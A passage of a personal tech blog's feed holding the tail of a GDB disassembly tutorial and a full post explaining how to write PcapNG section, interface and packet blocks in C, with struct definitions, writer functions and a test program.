Of course, you need not use GDB&rsquo;s disassembly feature for static analysis and can always use <a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a> or IDA (<a href="https://hex-rays.com/ida-free">Free Version</a> or <a href="https://hex-rays.com/ida-pro">Pro</a>)
which is a lot more user-friendly.</p>
<p>Assuming we can only use GDB, then the way to go about doing this is to make use of the <code>disassemble</code> command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># If no address/function is stated, disassemble function at current instruction.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disassemble the entire function</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble <span style="color:#f92672">[</span>Function<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disassemble the entire function that contain the given address</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble <span style="color:#f92672">[</span>Address<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disassemble instruction between start and end address. </span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble <span style="color:#f92672">[</span>Start<span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>End<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disassemble from start of function to address of function + offset.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble <span style="color:#f92672">[</span>Function<span style="color:#f92672">]</span>,+<span style="color:#f92672">[</span>Length<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disassmble from address to address + offset</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble <span style="color:#f92672">[</span>Address<span style="color:#f92672">]</span>,+<span style="color:#f92672">[</span>Length<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Show the current instruction (rip)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble /m <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Show the byte values of all instructions</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble /r <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">GDB command - disassemble<br><br></span>
<h3 id="61-test-example">6.1 Test Example</h3>
<p>
 
<video width=100% controls>
    <source src="/posts/gdb-guides/gdb-guide-part1-basics/videos/viewing-disassembly.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>

<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video">Viewing Disassembly - Short Demo<br><br></span></p>
<h2 id="7-conclusion">7. Conclusion</h2>
<p>I figured this is a good stopping point and of course, we are not yet done! I barely scratched the surface just for the basics! Stay tuned for part 2, where I will teach you more about Linux calling conventions, setting breakpoints etc.</p>
<h2 id="8-references">8. References</h2>
<ol>
<li>GDB Manual: <a href="https://sourceware.org/gdb/current/onlinedocs/gdb.html/">https://sourceware.org/gdb/current/onlinedocs/gdb.html/</a></li>
</ol>
<h2 id="9-resources">9. Resources</h2>
<ol>
<li><a href="/posts/gdb-guides/gdb-guide-part1-basics/resources/test.c">test.c</a></li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>Writing Packets to Pcapng in C</title>
            <link>https://mathscantor.github.io/posts/writing-packets-to-pcapng-in-c/</link>
            <pubDate>Fri, 17 Jan 2025 10:56:44 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/writing-packets-to-pcapng-in-c/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;Welcome back fellow researchers! Recently, I was developing custom tools for packet sniffing in C and needed to write my own PcapNG library.
The PcapNG file structure can be found on the &lt;a href=&#34;https://pcapng.com/&#34;&gt;Official PcapNG Documentation&lt;/a&gt;. Even though Erik Hjelmvik, the author was nice enough to provide examples for different section blocks, the guide isn&amp;rsquo;t the most comprehensible.&lt;/p&gt;
&lt;p&gt;Therefore, I thought it would be good to share some insights on writing a simple library in C to save your packets in a PcapNG file. And of course, I will be providing the source code &lt;a href=&#34;https://mathscantor.github.io/posts/writing-packets-to-pcapng-in-c/resources/pcapng-example.zip&#34;&gt;here&lt;/a&gt; as well.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>Welcome back fellow researchers! Recently, I was developing custom tools for packet sniffing in C and needed to write my own PcapNG library.
The PcapNG file structure can be found on the <a href="https://pcapng.com/">Official PcapNG Documentation</a>. Even though Erik Hjelmvik, the author was nice enough to provide examples for different section blocks, the guide isn&rsquo;t the most comprehensible.</p>
<p>Therefore, I thought it would be good to share some insights on writing a simple library in C to save your packets in a PcapNG file. And of course, I will be providing the source code <a href="/posts/writing-packets-to-pcapng-in-c/resources/pcapng-example.zip">here</a> as well.</p>
<h2 id="2-overall-pcapng-structure">2. Overall PcapNG Structure.</h2>
<img class="center" alt="pcapng-structure" src="/posts/writing-packets-to-pcapng-in-c/images/pcapng-structure.png">
<div style="text-align: center;"><p>Figure 1. PcapNG Structure</p></div>
<p>The overall structure can be broken down into 3 parts:</p>
<ol>
<li>Section Header Block (SHB)
<ul>
<li>Only can have 1</li>
</ul>
</li>
<li>Interface Description Block (IDB)
<ul>
<li>Can have multiple IDBs to represent different interfaces</li>
</ul>
</li>
<li>Enhanced Packet Block (EPB)
<ul>
<li>EPB headers can relate back to different interfaces where the packet was captured.</li>
</ul>
</li>
</ol>
<p>In addition, <strong>the entire structure must be word-aligned</strong> (divisible by 4 bytes). This means that padding is necessary if it&rsquo;s not word-aligned.
<link href="/posts/css/alert.css" rel="stylesheet">
<div class="alert important">
    <div class="alert-content">
        <div class="alert-header">
            <span class="alert-icon"></span>
            <strong class="alert-title">Important</strong>
        </div>
        <div class="alert-body"><ul>
<li>Ensure that you pad with <code>0x00</code> just before the redundant block total length section.</li>
<li>Do not pad <code>0x00</code> at the end of each block!</li>
</ul>
</div>
    </div>
</div>
</p>
<h2 id="3-section-header-block-shb">3. Section Header Block (SHB)</h2>
<img class="center" alt="shb-structure" src="/posts/writing-packets-to-pcapng-in-c/images/shb-structure.png">
<div style="text-align: center;"><p>Figure 2. SHB Structure</p></div>
<p>Figure 2 can be partially translated into the following SHB header struct:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> block_type;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> block_length;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> bom;      
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> major_version;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> minor_version;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> section_length;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">shb_headers_t</span>;
</span></span></code></pre></div><div style="text-align: center;"><p>Listing 1. SHB Header Struct</p></div>
<p>Do take note that I did not include a <code>uint32_t block_length_redundant</code> in the struct. This is because we have to place
a padding before the redundant block length, and the padding length can vary. A struct declaration cannot take in a member with
a variable size and therefore, we have to declare it separately. The same logic will be carried through to the other blocks.</p>
<p>According to the documentation, there are some constants we need to adhere to:</p>
<ul>
<li>Block Type = <code>0x0A0D0D0A</code> &ndash;&gt; SHB Type</li>
<li>Byte-Order Magic = <code>0x1A2B3C4D</code> &ndash;&gt; Little Endian</li>
<li>Major Version = <code>0x0001</code></li>
<li>Minor Version = <code>0x0000</code></li>
<li>Section Length = <code>0xFFFFFFFFFFFFFFFF</code> &ndash;&gt; -1</li>
</ul>
<p>The writing of the SHB section can be translated into the following C snippet:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define SHB_TYPE 0x0A0D0D0A
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define BOM 0x1A2B3C4D
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">pcapng_write_shb_section</span>(FILE <span style="color:#f92672">*</span>pcapng_file) {
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> block_length <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">shb_headers_t</span>) <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(block_length);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> padding_length <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">-</span> (block_length <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    block_length <span style="color:#f92672">+=</span> padding_length;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#f92672">*</span>padding <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(padding_length);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(padding, <span style="color:#ae81ff">0</span>, padding_length);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">shb_headers_t</span> shb_headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        .block_type <span style="color:#f92672">=</span> SHB_TYPE,
</span></span><span style="display:flex;"><span>        .block_length <span style="color:#f92672">=</span> block_length,
</span></span><span style="display:flex;"><span>        .bom <span style="color:#f92672">=</span> BOM,
</span></span><span style="display:flex;"><span>        .major_version <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>        .minor_version <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>        .section_length <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fwrite</span>(<span style="color:#f92672">&amp;</span>shb_headers, <span style="color:#66d9ef">sizeof</span>(shb_headers), <span style="color:#ae81ff">1</span>, pcapng_file)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fwrite</span>(padding, padding_length, <span style="color:#ae81ff">1</span>, pcapng_file)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fwrite</span>(<span style="color:#f92672">&amp;</span>block_length, <span style="color:#66d9ef">sizeof</span>(block_length), <span style="color:#ae81ff">1</span>, pcapng_file)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(pcapng_file);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div style="text-align: center;"><p>Listing 2. Write SHB Section Example</p></div>
<h2 id="4-interface-description-block-idb">4. Interface Description Block (IDB)</h2>
<img class="center" alt="idb-structure" src="/posts/writing-packets-to-pcapng-in-c/images/idb-structure.png">
<div style="text-align: center;"><p>Figure 3. IDB Structure</p></div>
<p>Figure 3 can be partially translated into the following IDB header struct:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> block_type;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> block_length;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> link_type;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> reserved;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> snap_len;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">idb_headers_t</span>;
</span></span></code></pre></div><div style="text-align: center;"><p>Listing 3. IDB Header Struct</p></div>
<p>Constants to adhere to:</p>
<ul>
<li>Block Type = <code>0x00000001</code> &ndash;&gt; IDB Type</li>
<li>Link Type = <code>0x0001</code> &ndash;&gt; Ethernet</li>
<li>Reserved = <code>0x0000</code></li>
<li>Snap Length = <code>0x0000FFFF</code>(65535 bytes) OR <br>
        = <code>0x00040000</code>(256kB) OR <br>
        = <code>0x00000000</code>(No Limit) <br></li>
</ul>
<p>The writing of the IDB section to a PcapNG file can be translated into the following C snippet:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define IDB_TYPE 0x00000001
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">pcapng_write_idb_section</span>(FILE <span style="color:#f92672">*</span>pcapng_file) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> block_length <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">idb_headers_t</span>) <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(block_length);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> padding_length <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">-</span> (block_length <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    block_length <span style="color:#f92672">+=</span> padding_length;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#f92672">*</span>padding <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(padding_length);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(padding, <span style="color:#ae81ff">0</span>, padding_length);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">idb_headers_t</span> idb_headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        .block_type <span style="color:#f92672">=</span> IDB_TYPE,
</span></span><span style="display:flex;"><span>        .block_length <span style="color:#f92672">=</span> block_length,
</span></span><span style="display:flex;"><span>        .link_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>        .reserved <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>        .snap_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">65535</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fwrite</span>(<span style="color:#f92672">&amp;</span>idb_headers, <span style="color:#66d9ef">sizeof</span>(idb_headers), <span style="color:#ae81ff">1</span>, pcapng_file)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fwrite</span>(padding, padding_length, <span style="color:#ae81ff">1</span>, pcapng_file)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fwrite</span>(<span style="color:#f92672">&amp;</span>block_length, <span style="color:#66d9ef">sizeof</span>(block_length), <span style="color:#ae81ff">1</span>, pcapng_file)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(pcapng_file);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div style="text-align: center;"><p>Listing 4. Write IDB Section Example</p></div>
<h2 id="5-enhanced-packet-block-epb">5. Enhanced Packet Block (EPB)</h2>
<img class="center" alt="epb-structure" src="/posts/writing-packets-to-pcapng-in-c/images/epb-structure.png">
<div style="text-align: center;"><p>Figure 4. EPB Structure</p></div>
<p>Figure 4 can be partially translated into the following EPB header struct:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> block_type;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> block_length;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> interface_id;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> timestamp_high;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> timestamp_low;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> captured_len;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> original_len;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">epb_headers_t</span>;
</span></span></code></pre></div><div style="text-align: center;"><p>Listing 5. EPB Header Struct</p></div>
<p>Constants to adhere to:</p>
<ul>
<li>Block Type = <code>0x00000006</code> &ndash;&gt; EPB Type</li>
<li>Interface ID = <code>0x00000000</code> &ndash;&gt; First IDB <br>
       = <code>0x00000001</code> &ndash;&gt; Second IDB (If there is more than 1)</li>
</ul>
<p>Things to note:</p>
<ul>
<li>Timestamp Upper = <code>(uint32_t)(unix_epoch_microseconds &gt;&gt; 32)</code></li>
<li>Timestamp Lower = <code>(uint32_t)(unix_epoch_microseconds)</code></li>
<li>In most cases, <code>captured_length == original_len</code>, unless a short snap length is used.</li>
<li>If a packet is truncated due to a short snap length stated in the IDB section, then <code>captured_length &lt; original_len</code>.</li>
</ul>
<p>The writing of the EPB section to a PcapNG file can be translated into the following C snippet:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">pcapng_write_packet</span>(FILE<span style="color:#f92672">*</span> pcapng_file, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>packet_data, <span style="color:#66d9ef">uint32_t</span> packet_length) {
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> block_length <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">epb_headers_t</span>) <span style="color:#f92672">+</span> packet_length <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(block_length);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> padding_length <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">-</span> (block_length <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    block_length <span style="color:#f92672">+=</span> padding_length;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#f92672">*</span>padding <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(padding_length);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(padding, <span style="color:#ae81ff">0</span>, padding_length);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> ts_high <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> ts_low <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> timeval tv;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gettimeofday</span>(<span style="color:#f92672">&amp;</span>tv, NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> unix_epoch_microseconds <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)tv.tv_sec <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000000ULL</span> <span style="color:#f92672">+</span> (<span style="color:#66d9ef">uint64_t</span>)tv.tv_usec;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    ts_high <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint32_t</span>)(unix_epoch_microseconds <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>);
</span></span><span style="display:flex;"><span>    ts_low <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint32_t</span>)(unix_epoch_microseconds);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">epb_headers_t</span> epb_header <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        .block_type <span style="color:#f92672">=</span> EPB_TYPE,
</span></span><span style="display:flex;"><span>        .block_length <span style="color:#f92672">=</span> block_length,
</span></span><span style="display:flex;"><span>        .interface_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>        .timestamp_high <span style="color:#f92672">=</span> ts_high,
</span></span><span style="display:flex;"><span>        .timestamp_low <span style="color:#f92672">=</span> ts_low,
</span></span><span style="display:flex;"><span>        .captured_len <span style="color:#f92672">=</span> packet_length,
</span></span><span style="display:flex;"><span>        .original_len <span style="color:#f92672">=</span> packet_length
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fwrite</span>(<span style="color:#f92672">&amp;</span>epb_header, <span style="color:#66d9ef">sizeof</span>(epb_header), <span style="color:#ae81ff">1</span>, pcapng_file)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fwrite</span>(packet_data, packet_length, <span style="color:#ae81ff">1</span>, pcapng_file)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fwrite</span>(padding, padding_length, <span style="color:#ae81ff">1</span>, pcapng_file)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fwrite</span>(<span style="color:#f92672">&amp;</span>block_length, <span style="color:#66d9ef">sizeof</span>(block_length), <span style="color:#ae81ff">1</span>, pcapng_file)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(pcapng_file);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div style="text-align: center;"><p>Listing 6. Write EPB Section Example</p></div>
<h2 id="6-example-usage-of-pcapngh">6. Example Usage of pcapng.h</h2>
<p>After putting all the logic into a header file called &ldquo;pcapng.h&rdquo;, and asking chatgpt to generate some sample data for us to test,
we are ready to go! If you want to follow along for this part of the walkthrough, you can get a copy of my files <a href="/posts/writing-packets-to-pcapng-in-c/resources/pcapng-example.zip">here</a>.</p>
<p>The following listing shows a simple example of saving packets to a PcapNG file called &ldquo;output.pcapng&rdquo; in the same directory.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pcapng.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pcapng_samples.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span> (<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    FILE <span style="color:#f92672">*</span>pcapng_file <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcapng_init_file</span>(<span style="color:#e6db74">&#34;output.pcapng&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pcapng_write_packet</span>(pcapng_file, sample_tcp_syn, <span style="color:#66d9ef">sizeof</span>(sample_tcp_syn));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pcapng_write_packet</span>(pcapng_file, sample_icmp_request, <span style="color:#66d9ef">sizeof</span>(sample_icmp_request));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pcapng_close_file</span>(pcapng_file);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div style="text-align: center;"><p>Listing 7. test.c</p></div>
<p>Compile the C program and run it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc test.c -o test
</span></span><span style="display:flex;"><span>$ ./test
</span></span></code></pre></div><div style="text-align: center;"><p>Listing 8. Running Test Case</p></div>
<p>We can now view our &ldquo;output.pcapng&rdquo; file with Wireshark!
<img class="center" alt="wireshark_output_pcapng" src="/posts/writing-packets-to-pcapng-in-c/images/wireshark_output_pcapng.png"></p>
<div style="text-align: center;"><p>Figure 5. Wireshark - output.pcapng</p></div>
<h2 id="7-conclusion">7. Conclusion</h2>
<p>If you have reached this stage after going through the above sections, you are now a qualified expert on writing PcapNG structures 😎.
In my next post, I am going to share some important tips for static and dynamic analysis based on past mistakes that I had made. Till then,
stay safe and keep being awesome. Over and out!
<img alt="pcapng-structure" src="/posts/writing-packets-to-pcapng-in-c/images/tapioca-goodnight-loop.gif" style="zoom:40%;"></p>
<h2 id="8-references">8. References</h2>
<ol>
<li>Official PcapNG Documentation: <a href="https://pcapng.com/">https://pcapng.com/</a></li>
</ol>
<h2 id="9-resources">9. Resources</h2>
<ol>
<li><a href="/posts/writing-packets-to-pcapng-in-c/resources/pcapng-example.zip">pcapng-example.zip</a></li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>Transferring Python Packages</title>
            <link>https://mathscantor.github.io/posts/transferring-python-packages/</link>
            <pubDate>Fri, 10 Jan 2025 08:38:41 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/transferring-python-packages/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
